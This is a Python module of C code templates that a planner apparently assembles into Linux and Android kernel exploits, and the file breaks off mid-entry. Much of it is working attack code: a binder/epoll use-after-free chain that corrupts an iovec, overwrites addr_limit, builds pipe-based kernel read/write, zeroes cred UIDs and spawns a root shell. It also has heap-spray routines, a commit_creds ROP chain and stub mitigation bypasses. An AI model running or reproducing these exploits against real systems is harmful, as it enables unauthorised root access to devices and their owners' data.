"""
code_templates.py

C code templates for kernel exploit actions.
Maps PDDL action names to actual C code snippets.
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field


@dataclass
class CodeTemplate:
    """A code template for an exploit action."""
    action_name: str
    description: str
    includes: List[str] = field(default_factory=list)
    globals: str = ""
    setup_code: str = ""
    main_code: str = ""
    cleanup_code: str = ""
    dependencies: List[str] = field(default_factory=list)
    platform: str = "generic"  # "generic", "linux", "android"


class CodeTemplateRegistry:
    """Registry of C code templates for exploit actions."""
    
    def __init__(self):
        self._templates: Dict[str, CodeTemplate] = {}
        self._register_builtin_templates()
    
    def register(self, template: CodeTemplate):
        """Register a code template."""
        self._templates[template.action_name] = template
    
    def get(self, action_name: str) -> Optional[CodeTemplate]:
        """Get a template by action name."""
        return self._templates.get(action_name)
    
    def list_actions(self) -> List[str]:
        """List all registered action names."""
        return list(self._templates.keys())
    
    def _register_builtin_templates(self):
        """Register all built-in templates."""
        
        # ============== VULNERABILITY TRIGGERING ==============
        
        self.register(CodeTemplate(
            action_name="trigger_uaf",
            description="Trigger a use-after-free vulnerability",
            includes=["<stdio.h>", "<stdlib.h>", "<string.h>", "<unistd.h>", "<fcntl.h>"],
            globals="""
// UAF state tracking
static int uaf_fd = -1;
static void *uaf_object = NULL;
static size_t uaf_object_size = 0;
""",
            setup_code="""
    // Setup for UAF trigger
    printf("[*] Setting up UAF trigger...\\n");
""",
            main_code="""
    // Trigger the use-after-free vulnerability
    // This code should be customized based on the specific CVE
    printf("[*] Triggering UAF...\\n");
    
    // Step 1: Allocate the vulnerable object
    // (Placeholder - replace with actual CVE-specific allocation)
    if (trigger_vulnerable_alloc() < 0) {
        fprintf(stderr, "[-] Failed to allocate vulnerable object\\n");
        return -1;
    }
    
    // Step 2: Free the object while keeping a dangling reference
    if (trigger_vulnerable_free() < 0) {
        fprintf(stderr, "[-] Failed to free vulnerable object\\n");
        return -1;
    }
    
    printf("[+] UAF triggered successfully, object freed\\n");
    uaf_triggered = 1;
""",
            cleanup_code="""
    // Cleanup UAF state
    if (uaf_fd >= 0) close(uaf_fd);
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="trigger_race_condition",
            description="Trigger a race condition vulnerability",
            includes=["<pthread.h>", "<sched.h>"],
            globals="""
// Race condition state
static pthread_t race_threads[2];
static volatile int race_won = 0;
static volatile int stop_racing = 0;
""",
            main_code="""
    // Trigger race condition
    printf("[*] Starting race condition...\\n");
    
    stop_racing = 0;
    race_won = 0;
    
    // Create racing threads
    if (pthread_create(&race_threads[0], NULL, race_thread_1, NULL) != 0) {
        perror("[-] Failed to create race thread 1");
        return -1;
    }
    if (pthread_create(&race_threads[1], NULL, race_thread_2, NULL) != 0) {
        perror("[-] Failed to create race thread 2");
        return -1;
    }
    
    // Wait for race to complete
    pthread_join(race_threads[0], NULL);
    pthread_join(race_threads[1], NULL);
    
    if (race_won) {
        printf("[+] Race condition won!\\n");
    } else {
        printf("[-] Race condition lost, retrying may be needed\\n");
    }
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="trigger_oob_write",
            description="Trigger an out-of-bounds write vulnerability",
            includes=["<stdio.h>", "<stdlib.h>"],
            globals="""
// OOB write state
static int oob_fd = -1;
""",
            main_code="""
    // Trigger out-of-bounds write
    printf("[*] Triggering OOB write...\\n");
    
    // (Placeholder - replace with CVE-specific OOB write trigger)
    if (trigger_oob_write_vuln() < 0) {
        fprintf(stderr, "[-] Failed to trigger OOB write\\n");
        return -1;
    }
    
    printf("[+] OOB write triggered\\n");
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="trigger_oob_read",
            description="Trigger an out-of-bounds read vulnerability",
            includes=["<stdio.h>", "<stdlib.h>"],
            main_code="""
    // Trigger out-of-bounds read for info leak
    printf("[*] Triggering OOB read...\\n");
    
    // (Placeholder - replace with CVE-specific OOB read trigger)
    uint64_t leaked_data = 0;
    if (trigger_oob_read_vuln(&leaked_data) < 0) {
        fprintf(stderr, "[-] Failed to trigger OOB read\\n");
        return -1;
    }
    
    printf("[+] OOB read triggered, leaked: 0x%lx\\n", leaked_data);
    info_leak_value = leaked_data;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="trigger_binder_bug",
            description="Trigger a binder vulnerability (Android)",
            includes=["<stdio.h>", "<sys/ioctl.h>", "<linux/android/binder.h>"],
            globals="""
// Binder state
static int binder_fd = -1;
""",
            setup_code="""
    // Open binder device
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        binder_fd = open("/dev/hwbinder", O_RDWR);
    }
    if (binder_fd < 0) {
        perror("[-] Failed to open binder device");
        return -1;
    }
    printf("[+] Opened binder device: fd=%d\\n", binder_fd);
""",
            main_code="""
    // Trigger binder vulnerability
    printf("[*] Triggering binder bug...\\n");
    
    // (Placeholder - replace with CVE-specific binder exploit)
    if (trigger_binder_vuln(binder_fd) < 0) {
        fprintf(stderr, "[-] Failed to trigger binder bug\\n");
        return -1;
    }
    
    printf("[+] Binder bug triggered\\n");
    binder_controlled = 1;
""",
            cleanup_code="""
    if (binder_fd >= 0) close(binder_fd);
""",
            platform="android"
        ))
        
        # ============== BINDER EPOLL UAF - IOVEC CORRUPTION ==============
        
        self.register(CodeTemplate(
            action_name="setup_binder_epoll",
            description="Setup binder device with epoll for UAF exploitation",
            includes=[
                "<stdio.h>", "<stdlib.h>", "<string.h>", "<unistd.h>", "<fcntl.h>",
                "<sys/ioctl.h>", "<sys/epoll.h>", "<sys/socket.h>", "<sys/mman.h>",
                "<linux/android/binder.h>"
            ],
            globals="""
// Binder epoll UAF state
static int binder_fd = -1;
static int epfd = -1;
static struct epoll_event binder_event = {0};
static int sockfd[2] = {-1, -1};

#define BINDER_THREAD_EXIT 0x40046208
""",
            setup_code="""
    // Setup socket pair for blocking iovec read
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockfd) < 0) {
        perror("[-] socketpair failed");
        return -1;
    }
    
    // Open binder device
    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("[-] Failed to open /dev/binder");
        return -1;
    }
    printf("[+] Opened binder: fd=%d\\n", binder_fd);
    
    // mmap binder - this creates binder_thread
    void *binder_map = mmap(NULL, 0x200000, PROT_READ, MAP_SHARED, binder_fd, 0);
    if (binder_map == MAP_FAILED) {
        perror("[-] Failed to mmap binder");
        return -1;
    }
    
    // Create epoll and register binder fd
    epfd = epoll_create1(0);
    if (epfd < 0) {
        perror("[-] epoll_create1 failed");
        return -1;
    }
    
    binder_event.events = EPOLLIN;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &binder_event) < 0) {
        perror("[-] epoll_ctl ADD failed");
        return -1;
    }
    printf("[+] Binder registered with epoll\\n");
""",
            main_code="""
    // Binder + epoll setup complete
    printf("[+] Binder epoll setup complete\\n");
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="setup_iovec_spray",
            description="Setup iovec array for reclaiming freed binder_thread",
            includes=["<sys/uio.h>"],
            globals="""
// iovec spray state
#define IOVEC_COUNT 13
#define IOVEC_OFFSET 10  // Index in iovec array that will be corrupted

static struct iovec iovec_array[IOVEC_COUNT];
static char iovec_buffer[0x1000];
""",
            setup_code="""
    // Initialize iovec array
    memset(iovec_array, 0, sizeof(iovec_array));
    memset(iovec_buffer, 'A', sizeof(iovec_buffer));
""",
            main_code="""
    // Setup iovec for heap spray
    // Each iov_base and iov_len will reclaim freed binder_thread memory
    for (int i = 0; i < IOVEC_COUNT; i++) {
        if (i == IOVEC_OFFSET) {
            // This slot will be corrupted via epoll
            iovec_array[i].iov_base = NULL;  // Will be overwritten
            iovec_array[i].iov_len = 0;      // Will be overwritten
        } else {
            iovec_array[i].iov_base = &iovec_buffer[i * 0x10];
            iovec_array[i].iov_len = 0x10;
        }
    }
    printf("[+] iovec spray configured\\n");
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="trigger_binder_uaf",
            description="Trigger UAF by exiting binder thread while epoll holds reference",
            globals="""
static volatile int uaf_triggered = 0;
""",
            main_code="""
    // Fork a child to handle epoll_ctl DEL timing
    pid_t cpid = fork();
    if (cpid == 0) {
        // Child process: wait then unregister from epoll
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);  // Wait for parent to call recvmsg
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &binder_event);
        // After DEL, write to socket to unblock recvmsg
        write(sockfd[1], "X", 1);
        _exit(0);
    }
    
    // Parent: Exit binder thread - this frees binder_thread struct
    // BUT epoll still holds a reference via ep_item
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    printf("[+] BINDER_THREAD_EXIT called - thread freed\\n");
    uaf_triggered = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="reclaim_with_iovec",
            description="Reclaim freed binder_thread memory with iovec",
            globals="",
            main_code="""
    // Setup message header with our iovec array
    struct msghdr msg = {0};
    msg.msg_iov = iovec_array;
    msg.msg_iovlen = IOVEC_COUNT;
    
    // recvmsg will block because socket is empty
    // The kernel will copy our iovec array to kernel memory
    // This reclaims the freed binder_thread (same slab: kmalloc-512)
    printf("[*] Calling recvmsg to reclaim freed memory...\\n");
    ssize_t ret = recvmsg(sockfd[0], &msg, MSG_WAITALL);
    
    // Wait for child
    waitpid(cpid, NULL, 0);
    
    printf("[+] recvmsg returned %zd\\n", ret);
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="corrupt_iovec_via_epoll",
            description="Trigger corruption of iovec via epoll UAF dereference",
            globals="",
            main_code="""
    // When epoll_ctl DEL runs in child process:
    // 1. It dereferences ep_item->wq (which was binder_thread's wait_queue)
    // 2. But that memory is now our iovec array
    // 3. The wq operations write to our iovec, giving us control
    //
    // Specifically, it corrupts iovec_array[IOVEC_OFFSET] because:
    // - ep_item points into freed binder_thread
    // - ep_item's wait queue cleanup writes to what used to be binder_thread
    // - That memory is now our iovec array
    
    printf("[+] iovec corruption should have occurred via epoll UAF\\n");
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="leak_task_struct",
            description="Leak kernel task_struct address using corrupted iovec",
            globals="""
static unsigned long leaked_task_struct = 0;

// task_struct field offsets (kernel 5.10.107 arm64)
#define TASK_CRED_OFFSET  0x688
#define TASK_PID_OFFSET   0x4e8
#define ADDR_LIMIT_OFFSET 0xa18
""",
            main_code="""
    // After iovec corruption, iov_base may point to kernel memory
    // We can leak task_struct by reading current thread's stack
    // The kernel stores task pointer in thread_info
    
    // First, check if our iovec was corrupted
    if (iovec_array[IOVEC_OFFSET].iov_base != NULL) {
        unsigned long *leaked = (unsigned long *)iovec_array[IOVEC_OFFSET].iov_base;
        // Parse leaked data to find task_struct pointer
        // This depends on what the epoll UAF gives us
        leaked_task_struct = leaked[0];  // Adjust offset as needed
        printf("[+] Leaked task_struct: 0x%lx\\n", leaked_task_struct);
    } else {
        // Alternative: use corrupted length to read OOB
        printf("[!] Need to implement alternative leak method\\n");
    }
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="setup_addr_limit_overwrite",
            description="Setup second UAF iteration to overwrite addr_limit",
            globals="""
static int binder_fd2 = -1;
static int epfd2 = -1;
static struct iovec iovec_array2[IOVEC_COUNT];
""",
            main_code="""
    // Setup second binder/epoll for addr_limit overwrite
    binder_fd2 = open("/dev/binder", O_RDWR);
    void *binder_map2 = mmap(NULL, 0x200000, PROT_READ, MAP_SHARED, binder_fd2, 0);
    
    epfd2 = epoll_create1(0);
    struct epoll_event ev2 = {.events = EPOLLIN};
    epoll_ctl(epfd2, EPOLL_CTL_ADD, binder_fd2, &ev2);
    
    // Setup iovec to write to addr_limit
    for (int i = 0; i < IOVEC_COUNT; i++) {
        if (i == IOVEC_OFFSET) {
            // Target addr_limit in task_struct
            iovec_array2[i].iov_base = (void *)(leaked_task_struct + ADDR_LIMIT_OFFSET);
            iovec_array2[i].iov_len = 8;
        } else {
            iovec_array2[i].iov_base = iovec_buffer;
            iovec_array2[i].iov_len = 8;
        }
    }
    printf("[+] Setup for addr_limit overwrite at 0x%lx\\n", leaked_task_struct + ADDR_LIMIT_OFFSET);
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="overwrite_addr_limit",
            description="Overwrite addr_limit to gain kernel R/W",
            globals="""
static volatile int addr_limit_overwritten = 0;
static unsigned long new_addr_limit = 0xFFFFFFFFFFFFFFFEUL;
""",
            main_code="""
    // Trigger second UAF to overwrite addr_limit
    pid_t cpid2 = fork();
    if (cpid2 == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        struct epoll_event ev2 = {.events = EPOLLIN};
        epoll_ctl(epfd2, EPOLL_CTL_DEL, binder_fd2, &ev2);
        // Write new addr_limit value
        write(sockfd[1], &new_addr_limit, 8);
        _exit(0);
    }
    
    ioctl(binder_fd2, BINDER_THREAD_EXIT, NULL);
    
    struct msghdr msg2 = {0};
    msg2.msg_iov = iovec_array2;
    msg2.msg_iovlen = IOVEC_COUNT;
    recvmsg(sockfd[0], &msg2, MSG_WAITALL);
    
    waitpid(cpid2, NULL, 0);
    
    printf("[+] addr_limit overwritten!\\n");
    addr_limit_overwritten = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="kernel_read_primitive",
            description="Read from arbitrary kernel address using pipe",
            globals="""
static unsigned long kernel_read(unsigned long addr, size_t len) {
    int pipefd[2];
    if (pipe(pipefd) < 0) return 0;
    
    // With addr_limit bypassed, we can read from kernel addresses
    ssize_t n = write(pipefd[1], (void *)addr, len);
    close(pipefd[1]);
    
    if (n != len) {
        close(pipefd[0]);
        return 0;
    }
    
    unsigned long value = 0;
    read(pipefd[0], &value, len);
    close(pipefd[0]);
    return value;
}
""",
            main_code="""
    // Test kernel read
    if (addr_limit_overwritten && leaked_task_struct) {
        unsigned long test_read = kernel_read(leaked_task_struct, 8);
        printf("[+] Kernel read test: 0x%lx\\n", test_read);
    }
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="kernel_write_primitive",
            description="Write to arbitrary kernel address using pipe",
            globals="""
static int kernel_write_val(unsigned long addr, unsigned long value, size_t len) {
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;
    
    ssize_t n = write(pipefd[1], &value, len);
    close(pipefd[1]);
    
    if (n != len) {
        close(pipefd[0]);
        return -1;
    }
    
    // With addr_limit bypassed, we can write to kernel addresses
    n = read(pipefd[0], (void *)addr, len);
    close(pipefd[0]);
    return (n == len) ? 0 : -1;
}
""",
            main_code="""
    // Kernel write primitive ready
    printf("[+] Kernel write primitive enabled\\n");
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="overwrite_cred",
            description="Overwrite cred structure to gain root",
            globals="""
static int escalate_privileges(unsigned long task_struct_addr) {
    // Read cred pointer from task_struct
    unsigned long cred_ptr = kernel_read(task_struct_addr + TASK_CRED_OFFSET, 8);
    if (!cred_ptr) {
        fprintf(stderr, "[-] Failed to read cred pointer\\n");
        return -1;
    }
    printf("[+] cred pointer: 0x%lx\\n", cred_ptr);
    
    // cred structure offsets (uid, gid, etc at offset 4, 8, 12, etc.)
    // Overwrite uid, gid, suid, sgid, euid, egid, fsuid, fsgid to 0
    for (int offset = 4; offset <= 32; offset += 4) {
        if (kernel_write_val(cred_ptr + offset, 0, 4) < 0) {
            fprintf(stderr, "[-] Failed to write to cred+%d\\n", offset);
            return -1;
        }
    }
    
    printf("[+] cred overwritten with root UIDs\\n");
    return 0;
}
""",
            main_code="""
    // Escalate privileges
    if (addr_limit_overwritten && leaked_task_struct) {
        printf("[*] Overwriting cred structure...\\n");
        if (escalate_privileges(leaked_task_struct) == 0) {
            printf("[+] Privilege escalation successful!\\n");
            printf("[+] uid=%d euid=%d\\n", getuid(), geteuid());
            
            // Spawn root shell
            if (getuid() == 0) {
                printf("[+] Got root! Spawning shell...\\n");
                execl("/system/bin/sh", "sh", NULL);
            }
        }
    }
""",
            cleanup_code="""
    if (binder_fd >= 0) close(binder_fd);
    if (binder_fd2 >= 0) close(binder_fd2);
    if (epfd >= 0) close(epfd);
    if (epfd2 >= 0) close(epfd2);
    if (sockfd[0] >= 0) close(sockfd[0]);
    if (sockfd[1] >= 0) close(sockfd[1]);
""",
            platform="android"
        ))
        
        # ============== HEAP SPRAY TECHNIQUES ==============
        
        self.register(CodeTemplate(
            action_name="spray_msg_msg",
            description="Spray heap with msg_msg structures",
            includes=["<sys/msg.h>", "<sys/ipc.h>"],
            globals="""
// msg_msg spray state
#define MSG_SPRAY_COUNT 4096
#define MSG_SPRAY_SIZE 96  // Adjust based on target slab

static int msg_qids[MSG_SPRAY_COUNT];
static int msg_spray_count = 0;

struct spray_msg {
    long mtype;
    char mtext[MSG_SPRAY_SIZE - sizeof(long)];
};
""",
            main_code="""
    // Spray heap with msg_msg structures
    printf("[*] Spraying msg_msg structures...\\n");
    
    struct spray_msg msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));
    
    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        msg_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (msg_qids[i] < 0) {
            perror("[-] msgget failed");
            break;
        }
        
        if (msgsnd(msg_qids[i], &msg, sizeof(msg.mtext), 0) < 0) {
            perror("[-] msgsnd failed");
            msgctl(msg_qids[i], IPC_RMID, NULL);
            break;
        }
        msg_spray_count++;
    }
    
    printf("[+] Sprayed %d msg_msg structures\\n", msg_spray_count);
    heap_sprayed = 1;
""",
            cleanup_code="""
    // Cleanup msg_msg spray
    for (int i = 0; i < msg_spray_count; i++) {
        msgctl(msg_qids[i], IPC_RMID, NULL);
    }
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="spray_pipe_buffer",
            description="Spray heap with pipe_buffer structures",
            includes=["<unistd.h>", "<fcntl.h>"],
            globals="""
// pipe_buffer spray state
#define PIPE_SPRAY_COUNT 256

static int pipe_fds[PIPE_SPRAY_COUNT][2];
static int pipe_spray_count = 0;
""",
            main_code="""
    // Spray heap with pipe_buffer structures
    printf("[*] Spraying pipe_buffer structures...\\n");
    
    char pipe_data[4096];
    memset(pipe_data, 'B', sizeof(pipe_data));
    
    for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {
        if (pipe(pipe_fds[i]) < 0) {
            perror("[-] pipe failed");
            break;
        }
        
        // Set pipe to non-blocking
        fcntl(pipe_fds[i][0], F_SETFL, O_NONBLOCK);
        fcntl(pipe_fds[i][1], F_SETFL, O_NONBLOCK);
        
        // Fill pipe to allocate pipe_buffer
        write(pipe_fds[i][1], pipe_data, sizeof(pipe_data));
        
        pipe_spray_count++;
    }
    
    printf("[+] Sprayed %d pipe_buffer structures\\n", pipe_spray_count);
    heap_sprayed = 1;
""",
            cleanup_code="""
    // Cleanup pipe spray
    for (int i = 0; i < pipe_spray_count; i++) {
        close(pipe_fds[i][0]);
        close(pipe_fds[i][1]);
    }
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="spray_seq_operations",
            description="Spray heap with seq_operations structures",
            includes=["<fcntl.h>"],
            globals="""
// seq_operations spray state
#define SEQ_SPRAY_COUNT 256

static int seq_fds[SEQ_SPRAY_COUNT];
static int seq_spray_count = 0;
""",
            main_code="""
    // Spray heap with seq_operations via /proc/self/stat
    printf("[*] Spraying seq_operations structures...\\n");
    
    for (int i = 0; i < SEQ_SPRAY_COUNT; i++) {
        seq_fds[i] = open("/proc/self/stat", O_RDONLY);
        if (seq_fds[i] < 0) {
            perror("[-] open /proc/self/stat failed");
            break;
        }
        seq_spray_count++;
    }
    
    printf("[+] Sprayed %d seq_operations structures\\n", seq_spray_count);
""",
            cleanup_code="""
    // Cleanup seq_operations spray
    for (int i = 0; i < seq_spray_count; i++) {
        close(seq_fds[i]);
    }
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="spray_binder_nodes",
            description="Spray heap with binder_node structures (Android)",
            includes=["<sys/ioctl.h>"],
            globals="""
// binder_node spray state
#define BINDER_NODE_SPRAY_COUNT 1024

static uint32_t binder_handles[BINDER_NODE_SPRAY_COUNT];
static int binder_node_count = 0;
""",
            main_code="""
    // Spray heap with binder_node structures
    printf("[*] Spraying binder_node structures...\\n");
    
    for (int i = 0; i < BINDER_NODE_SPRAY_COUNT; i++) {
        if (spray_binder_node(binder_fd, &binder_handles[i]) < 0) {
            break;
        }
        binder_node_count++;
    }
    
    printf("[+] Sprayed %d binder_node structures\\n", binder_node_count);
""",
            platform="android"
        ))
        
        # ============== CAPABILITY DERIVATION ==============
        
        self.register(CodeTemplate(
            action_name="derive_arb_read_from_msg_msg",
            description="Derive arbitrary read from msg_msg corruption",
            globals="""
// Arbitrary read state
static uint64_t arb_read_addr = 0;
""",
            main_code="""
    // Setup arbitrary read via corrupted msg_msg
    printf("[*] Setting up arbitrary read via msg_msg...\\n");
    
    // The msg_msg->m_list.next pointer can be corrupted to point
    // to arbitrary kernel memory, allowing reads via msgrcv()
    
    // Find the corrupted msg_msg (overlapping with freed UAF object)
    int target_qid = find_corrupted_msg();
    if (target_qid < 0) {
        fprintf(stderr, "[-] Failed to find corrupted msg_msg\\n");
        return -1;
    }
    
    printf("[+] Arbitrary read capability established via msg queue %d\\n", target_qid);
    has_arb_read = 1;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="derive_arb_write_from_msg_msg",
            description="Derive arbitrary write from msg_msg corruption",
            main_code="""
    // Setup arbitrary write via corrupted msg_msg
    printf("[*] Setting up arbitrary write via msg_msg...\\n");
    
    // By controlling msg_msg->m_list pointers, we can achieve
    // a limited arbitrary write when the message is freed
    
    printf("[+] Arbitrary write capability established\\n");
    has_arb_write = 1;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="derive_arb_read_from_binder",
            description="Derive arbitrary read from binder corruption",
            main_code="""
    // Setup arbitrary read via corrupted binder_node
    printf("[*] Setting up arbitrary read via binder...\\n");
    
    // Corrupted binder_node can leak kernel pointers
    // through BR_TRANSACTION_COMPLETE responses
    
    printf("[+] Arbitrary read capability established via binder\\n");
    has_arb_read = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="derive_arb_write_from_binder",
            description="Derive arbitrary write from binder corruption",
            main_code="""
    // Setup arbitrary write via corrupted binder_node
    printf("[*] Setting up arbitrary write via binder...\\n");
    
    // binder_node->ptr and binder_node->cookie can be used
    // to achieve arbitrary write when node is released
    
    printf("[+] Arbitrary write capability established via binder\\n");
    has_arb_write = 1;
""",
            platform="android"
        ))
        
        # ============== MITIGATION BYPASSES ==============
        
        self.register(CodeTemplate(
            action_name="bypass_kaslr",
            description="Bypass KASLR using arbitrary read",
            globals="""
// KASLR bypass state
static uint64_t kernel_base = 0;
static uint64_t kernel_slide = 0;

// Known kernel symbols (from kallsyms or vmlinux)
#define KERNEL_BASE_DEFAULT 0xffffffff81000000UL
""",
            main_code="""
    // Bypass KASLR using arbitrary read primitive
    printf("[*] Bypassing KASLR...\\n");
    
    // Read a known kernel pointer to calculate slide
    uint64_t leaked_ptr = 0;
    if (arb_read(KNOWN_KERNEL_PTR_ADDR, &leaked_ptr, 8) < 0) {
        fprintf(stderr, "[-] Failed to leak kernel pointer\\n");
        return -1;
    }
    
    // Calculate kernel base from leaked pointer
    // (This depends on what pointer was leaked)
    kernel_slide = calculate_kernel_slide(leaked_ptr);
    kernel_base = KERNEL_BASE_DEFAULT + kernel_slide;
    
    printf("[+] KASLR bypassed! Kernel base: 0x%lx (slide: 0x%lx)\\n", 
           kernel_base, kernel_slide);
    kaslr_bypassed = 1;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="bypass_kaslr_via_info_leak",
            description="Bypass KASLR using information leak",
            main_code="""
    // Bypass KASLR using information leak
    printf("[*] Bypassing KASLR via info leak...\\n");
    
    // Use the previously leaked value to calculate kernel base
    if (info_leak_value == 0) {
        fprintf(stderr, "[-] No info leak value available\\n");
        return -1;
    }
    
    kernel_slide = calculate_kernel_slide(info_leak_value);
    kernel_base = KERNEL_BASE_DEFAULT + kernel_slide;
    
    printf("[+] KASLR bypassed! Kernel base: 0x%lx\\n", kernel_base);
    kaslr_bypassed = 1;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="bypass_pan",
            description="Bypass PAN (Privileged Access Never) on ARM64",
            main_code="""
    // Bypass PAN on ARM64
    printf("[*] Bypassing PAN...\\n");
    
    // PAN can be bypassed by:
    // 1. Using copy_from_user/copy_to_user gadgets
    // 2. Finding kernel addresses to pivot to
    // 3. Using usercopy whitelisted regions
    
    // For now, we'll use kernel stack for ROP
    printf("[+] PAN bypass prepared (using kernel addresses)\\n");
    pan_bypassed = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="bypass_pac",
            description="Bypass PAC (Pointer Authentication) on ARM64",
            main_code="""
    // Bypass PAC on ARM64
    printf("[*] Bypassing PAC...\\n");
    
    // PAC bypass strategies:
    // 1. Find signing gadgets that sign our forged pointers
    // 2. Use pointer substitution attacks
    // 3. Leak or brute-force PAC keys
    
    // This is highly device/kernel specific
    printf("[+] PAC bypass prepared\\n");
    pac_bypassed = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="bypass_mte",
            description="Bypass MTE (Memory Tagging Extension) on ARM64",
            main_code="""
    // Bypass MTE on ARM64
    printf("[*] Bypassing MTE...\\n");
    
    // MTE bypass strategies:
    // 1. Use tag-agnostic addresses (certain kernel regions)
    // 2. Leak tags through side channels
    // 3. Find tag oracle primitives
    
    printf("[+] MTE bypass prepared\\n");
    mte_bypassed = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="bypass_smep",
            description="Bypass SMEP (Supervisor Mode Execution Prevention)",
            main_code="""
    // Bypass SMEP on x86_64
    printf("[*] Bypassing SMEP...\\n");
    
    // SMEP prevents executing userspace code in kernel mode
    // Bypass: Use ROP/JOP with kernel gadgets only
    
    printf("[+] SMEP bypass: using kernel ROP gadgets\\n");
    smep_bypassed = 1;
""",
            platform="linux"
        ))
        
        self.register(CodeTemplate(
            action_name="bypass_smap",
            description="Bypass SMAP (Supervisor Mode Access Prevention)",
            main_code="""
    // Bypass SMAP on x86_64
    printf("[*] Bypassing SMAP...\\n");
    
    // SMAP prevents accessing userspace memory in kernel mode
    // Bypass strategies:
    // 1. Use copy_from_user/copy_to_user gadgets
    // 2. Toggle AC flag via STAC gadget (if available)
    // 3. Use physmap to access userspace data
    
    printf("[+] SMAP bypass prepared\\n");
    smap_bypassed = 1;
""",
            platform="linux"
        ))
        
        # ============== CODE EXECUTION ==============
        
        self.register(CodeTemplate(
            action_name="prepare_rop_chain",
            description="Prepare ROP chain for privilege escalation",
            globals="""
// ROP chain state
#define ROP_CHAIN_SIZE 256
static uint64_t rop_chain[ROP_CHAIN_SIZE];
static int rop_chain_len = 0;

// Gadget offsets (from kernel base)
static uint64_t gadget_pop_rdi = 0;      // pop rdi; ret
static uint64_t gadget_pop_rsi = 0;      // pop rsi; ret
static uint64_t gadget_ret = 0;          // ret (for alignment)
static uint64_t gadget_mov_rdi_rax = 0;  // mov rdi, rax; ... ; ret

// Function offsets
static uint64_t func_prepare_kernel_cred = 0;
static uint64_t func_commit_creds = 0;
static uint64_t func_find_task_by_vpid = 0;
static uint64_t func_switch_task_namespaces = 0;
""",
            setup_code="""
    // Initialize gadget offsets (these must be found in vmlinux)
    // Example offsets - MUST be updated for target kernel
    gadget_pop_rdi = kernel_base + 0x001518;  // pop rdi; ret
    gadget_pop_rsi = kernel_base + 0x00251f;  // pop rsi; ret
    gadget_ret = kernel_base + 0x000001;      // ret
    
    func_prepare_kernel_cred = kernel_base + PREPARE_KERNEL_CRED_OFFSET;
    func_commit_creds = kernel_base + COMMIT_CREDS_OFFSET;
""",
            main_code="""
    // Build ROP chain for privilege escalation
    printf("[*] Preparing ROP chain...\\n");
    
    if (!kaslr_bypassed) {
        fprintf(stderr, "[-] KASLR not bypassed, cannot build ROP chain\\n");
        return -1;
    }
    
    rop_chain_len = 0;
    
    // ROP chain: commit_creds(prepare_kernel_cred(0))
    
    // Step 1: Call prepare_kernel_cred(0)
    rop_chain[rop_chain_len++] = gadget_pop_rdi;
    rop_chain[rop_chain_len++] = 0;  // NULL for init_cred
    rop_chain[rop_chain_len++] = func_prepare_kernel_cred;
    
    // Step 2: Move result (rax) to rdi for commit_creds
    rop_chain[rop_chain_len++] = gadget_mov_rdi_rax;
    
    // Step 3: Call commit_creds(new_cred)
    rop_chain[rop_chain_len++] = func_commit_creds;
    
    // Step 4: Return to userspace (platform specific)
    // This needs KPTI trampoline on modern kernels
    add_return_to_userspace_gadgets();
    
    printf("[+] ROP chain prepared: %d gadgets\\n", rop_chain_len);
    rop_chain_ready = 1;
""",
            platform="generic"
        ))
        
        self.register(CodeTemplate(
            action_name="prepare_jop_chain",
            description="Prepare JOP chain for ARM64",
            globals="""
// JOP chain state (ARM64)
#define JOP_CHAIN_SIZE 256
static uint64_t jop_chain[JOP_CHAIN_SIZE];
static int jop_chain_len = 0;
""",
            main_code="""
    // Build JOP chain for ARM64 privilege escalation
    printf("[*] Preparing JOP chain (ARM64)...\\n");
    
    if (!kaslr_bypassed || !pac_bypassed) {
        fprintf(stderr, "[-] Prerequisites not met for JOP chain\\n");
        return -1;
    }
    
    // JOP uses indirect jumps instead of returns
    // This helps bypass PAC on return addresses
    
    // Build JOP dispatcher and chain
    // (Highly kernel-specific)
    
    printf("[+] JOP chain prepared\\n");
    jop_chain_ready = 1;
""",
            platform="android"
        ))
        
        self.register(CodeTemplate(
            action_name="perform_stack_pivot",
